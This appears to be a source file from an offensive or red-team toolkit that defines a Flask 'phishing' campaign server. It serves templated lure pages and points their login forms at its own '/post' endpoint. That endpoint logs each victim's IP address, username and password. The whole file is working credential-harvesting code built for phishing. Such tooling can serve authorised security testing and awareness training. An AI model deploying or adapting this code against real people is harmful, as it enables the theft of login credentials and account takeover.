from base.webserver import *
from flask import Response
from lib.config import CAMPAIGN_PATH
import os

class Campaign(Base):
  def __init__(self):
    self.data_path = os.path.join(CAMPAIGN_PATH, 'phishing', 'data')
    self.env = get_new_campaign_fs_env('phishing')

  @route('/post', methods=['POST'])
  def handle_post(self):
    user_name = request.form.get('user')
    password = request.form.get('pass')
    print(f'{self.get_remote_addr()} Username: {user_name}; Password: {password}')
    print('')
    return 'OK\n'

  @route('/<filename>', methods=['GET'])
  def handle_get(self, filename):
    print(f'{self.get_remote_addr()} requesting: {filename}')
    if not os.path.exists(os.path.join(self.data_path, filename)):
      abort(404)
    template = self.env.get_template(filename)
    endpoint = urljoin(server.config['pingback'], 'post')
    html = template.render(postto=endpoint)
    src, full_path, _update = self.env.loader.get_source(self.env, filename)
    mime, encoding = mimetypes.guess_type(full_path)
    return Response(html, mimetype=mime)

Campaign.register(server, route_base='/')
